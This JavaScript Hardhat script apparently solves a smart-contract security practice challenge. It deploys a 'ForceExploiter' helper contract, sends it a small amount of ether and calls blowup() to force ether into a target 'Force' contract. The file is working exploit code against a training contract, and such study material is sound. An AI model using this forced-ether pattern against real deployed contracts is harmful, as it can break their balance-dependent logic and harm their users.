// force.js - Exploits the Force contract

// Import statements
require("dotenv").config();
const { ethers } = require("hardhat");
const { forceAddress, forceAbi } = require("../contracts");

async function main() {
    // Get ethers signer and contract instances
    const provider = ethers.provider;
    const account = await ethers.getSigner();
    const force = new ethers.Contract(forceAddress, forceAbi, provider);
    const forceSigner = force.connect(account);

    // Deploy the Exploiter contract
    const Exploiter = await ethers.getContractFactory("ForceExploiter");
    const exploiter = await Exploiter.deploy(forceAddress);

    await exploiter.deployed();

    console.log("Exploiter deployed to:", exploiter.address);

    // Call exploit
    console.log("Running exploit.")

    console.log("Sending a small amount of ether to the exploiter contract.");
    let sendTxn = await account.sendTransaction({
        value: ethers.constants.One,
        to: exploiter.address
    });
    await sendTxn.wait();

    console.log("Calling the blowup function to force sending ether to the force contract");
    let exploitTxn = await exploiter.blowup();
    await exploitTxn.wait();

    // Confirm exploit 
    let balance = await provider.getBalance(forceAddress);
    console.log("Balance of Force contract is now:", balance);

    console.log("Exploit completed.")


}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });